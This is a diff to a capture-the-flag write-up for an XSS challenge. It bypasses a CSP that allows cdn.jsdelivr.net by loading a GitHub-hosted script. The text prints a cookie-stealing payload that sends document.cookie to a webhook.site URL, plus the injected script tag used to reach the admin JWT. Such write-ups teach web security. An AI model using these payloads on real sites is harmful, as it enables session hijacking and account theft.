@@ -146,18 +146,20 @@ The only allowed parameters in the `script-src` directive are self and `https://
 The problem with this policy is that literally anyone can host `JavaScript` files on `https://cdn.jsdelivr.net`. To host your JavaScript files on `https://cdn.jsdelivr.net`, simply create a public GitHub repository and host your JavaScript files in there. Then you can format the `https://cdn.jsdelivr.net` in a way that it would dynamically pull the JavaScript file from your GitHub repository. The format of the `https://cdn.jsdelivr.net` should be as follows:
 
 ```
-https://cdn.jsdelivr.net/gh/<github_username>/<repository_name>/<file_name>.js
+https://cdn.jsdelivr.net/gh/<github_username>/<repository_name>@master/<file_name>.js
 ```
 
 In my case, I created a [public GitHub repository](https://github.com/darshannn10/cursed-web-party-payload/blob/main/xss-poc.js) and hosted a file xss-poc.js in there. So for me, this is what the URL looks like:
 
 ```
-https://cdn.jsdelivr.net/gh/darshannn10/cursed-web-party-payload/xss-poc.js
+https://cdn.jsdelivr.net/gh/darshannn10/cursed-web-party-payload@master/xss-poc.js
 ```
 
 This `xss.poc` gets the cookies and submits them to my [webhook.site](https://webhook.site/).
 ```javascript
-var i = new Image;i.src="https://webhook.site/70c3e906-3fe0-46de-95f9-045b725a9d6b"+document.cookie;
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/70c3e906-3fe0-46de-95f9-045b725a9d6b/?' + document.cookie, true);
+xhttp.send();
 ```
 
 Next, I inject the following payload in the `halloween_name` parameter in the `/api/submit` request which first closes the div tag and then add our script from the github.
@@ -166,11 +168,12 @@ Next, I inject the following payload in the `halloween_name` parameter in the `/
 </div><script src=\"https://cdn.jsdelivr.net/gh/darshannn10/cursed-web-party-payload/xss-poc.js\"></script>
 ```
 
-![cwp](https://user-images.githubusercontent.com/87711310/213440655-d0e9d878-2a78-4f32-963d-2b832dd27cda.png)
+![cwp](https://user-images.githubusercontent.com/87711310/213444155-6edc459e-4b0b-4394-a001-decf3e92c7fb.png)
 
 After I sent the request, I immediately got the query strings on my webhook client which contained cookie values.
 
-![cwp-1](https://user-images.githubusercontent.com/87711310/213442351-708d2b79-6c0d-4de5-98fb-eb09fba25e40.png)
+![cwp-3](https://user-images.githubusercontent.com/87711310/213444145-f7c837ff-223f-42df-8940-19b9c51a844d.png)
 
 Decoding the admin JWT, we get the flag.
-![cwp-2](https://user-images.githubusercontent.com/87711310/213442345-a1ec79f7-dcec-4d6f-a5f2-ad0ae1df8e90.png)
+![cwp-4](https://user-images.githubusercontent.com/87711310/213444151-86ca4abb-61f1-42e5-ad13-0bf3db28ab72.png)
+
